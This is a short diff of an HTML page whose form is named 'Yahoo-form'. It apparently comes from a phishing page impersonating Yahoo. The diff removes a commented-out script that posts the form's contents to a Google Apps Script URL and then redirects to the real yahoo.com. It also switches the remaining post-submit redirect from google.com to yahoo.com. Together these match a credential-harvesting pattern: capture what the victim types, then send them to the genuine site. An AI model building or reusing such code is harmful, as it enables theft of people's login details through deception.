@@ -92,26 +92,11 @@
                           response => response.json()
                       ).then((html) => {
                         // you can put any JS code here
-                        window.open('https://www.google.com', '_blank');
+                        window.open('https://www.yahoo.com', '_blank');
             
                       });
                     });
                     </script>
-<!--                     <script>
-                        const scriptURL = 'https://script.google.com/macros/s/AKfycbwRjmmAujxzZbL0R_xXaiEKLEVy8RuF0A6Ll6GXvxC5vxNZxw6_eVGQCpNDBoiiJJR7/exec'
-
-                        const form = document.forms['Yahoo-form']  // form id goes here
-                      
-                        form.addEventListener('submit', e => {
-                          e.preventDefault()
-                          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                            // .then(response => alert("Thank you! your form is submitted successfully." ))
-                            .then(() => {  window.location.reload(); })
-                            .then(() => {  window.location.href = "http://www.yahoo.com"; })  // redirection link goes here
-                            .catch(error => console.error('Error!', error.message))
-                        })
-                      </script> -->
-
                 </form>
             </div>
         </main>
